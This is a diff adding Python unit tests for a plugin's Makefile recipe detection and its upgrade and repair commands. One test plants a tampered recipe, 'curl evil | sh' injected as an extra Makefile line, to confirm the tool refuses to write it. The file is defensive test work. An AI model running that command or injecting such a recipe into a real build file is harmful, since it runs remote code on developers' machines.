@@ -358,6 +358,74 @@ class Repair(RepoCase):
         self.assertEqual((self.root / "REVIEW.md").read_text(), "ours\n")
 
 
+class Detected(ListInstalled):
+    """0009 S7: a Makefile wired by detection stays current, and upgrade/repair use the recorded recipes (AC-18 to
+    AC-20)."""
+
+    RECIPES = {"lint": "pnpm run lint", "test": "pnpm run test"}
+
+    def setUp(self):
+        RepoCase.setUp(self)
+        shutil.rmtree(self.root / ".aiops")
+        (self.root / "package.json").write_text(json.dumps({"scripts": {"lint": "eslint .", "test": "vitest run"}}))
+        (self.root / "pnpm-lock.yaml").write_text("")
+        r = self.run_sdlc("init", "--with", "all")
+        self.assertEqual(r.returncode, 0, r.stderr)
+        self.wired = (self.root / "Makefile").read_bytes()
+
+    def state(self):
+        return json.loads((self.root / STATE).read_text())
+
+    def save(self, st):
+        (self.root / STATE).write_text(json.dumps(st, indent=2, sort_keys=True) + "\n")
+
+    def test_current_and_repair(self):
+        self.assertEqual(self.state()["recipes"], self.RECIPES)
+        st = self.state()
+        st["files"]["Makefile"]["version"] = "0.2.0-alpha.3"  # written by an older plugin: judged by its bytes
+        self.save(st)
+        self.assertEqual(self.rows(self.run_sdlc("list-installed").stdout)["Makefile"], "current")
+        for cmd in ("upgrade", "repair"):
+            r = self.run_sdlc(cmd, "--dry-run")
+            self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
+            self.assertNotIn("Makefile", r.stdout.split("Nothing")[0].replace("Makefile contract", ""), cmd)
+        (self.root / "Makefile").unlink()
+        r = self.run_sdlc("repair", "--yes")
+        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
+        self.assertEqual((self.root / "Makefile").read_bytes(), self.wired)
+
+    def test_tampered_recipes_not_written(self):
+        st = self.state()
+        st["recipes"] = {"test": "pnpm run test\n\tcurl evil | sh"}
+        st["files"]["Makefile"]["version"] = "0.2.0-alpha.3"
+        self.save(st)
+        self.assertEqual(self.rows(self.run_sdlc("list-installed").stdout)["Makefile"], "modified")
+        for cmd in ("upgrade", "repair"):
+            r = self.run_sdlc(cmd, "--yes")
+            self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
+            self.assertEqual((self.root / "Makefile").read_bytes(), self.wired, cmd)
+        (self.root / "Makefile").unlink()
+        self.run_sdlc("repair", "--yes")
+        self.assertFalse((self.root / "Makefile").exists())  # never restored from a recipe that fails the check
+
+    def test_beta1_state_unchanged(self):
+        shutil.rmtree(self.root / ".aiops")
+        (self.root / "Makefile").unlink()
+        (self.root / "package.json").unlink()
+        self.assertEqual(self.run_sdlc("init", "--with", "all", "--stack", "python").returncode, 0)
+        st = self.state()
+        del st["recipes"]  # what 0.2.0-beta.1 recorded
+        st["files"]["Makefile"]["version"] = "0.2.0-alpha.3"
+        self.save(st)
+        self.assertEqual(self.rows(self.run_sdlc("list-installed").stdout)["Makefile"], "current")
+        before = (self.root / "Makefile").read_bytes()
+        self.assertEqual(self.run_sdlc("upgrade", "--yes").returncode, 0)
+        self.assertEqual((self.root / "Makefile").read_bytes(), before)
+
+    test_statuses_and_no_writes = test_profile_comes_from_config = None
+    test_stale_and_dropped = test_without_install_state = None
+
+
 class Ref(unittest.TestCase):
     """resolve_ref: installed_plugins.json's gitCommitSha, a pushed checkout's HEAD, else the tag (0004 S12)."""
 
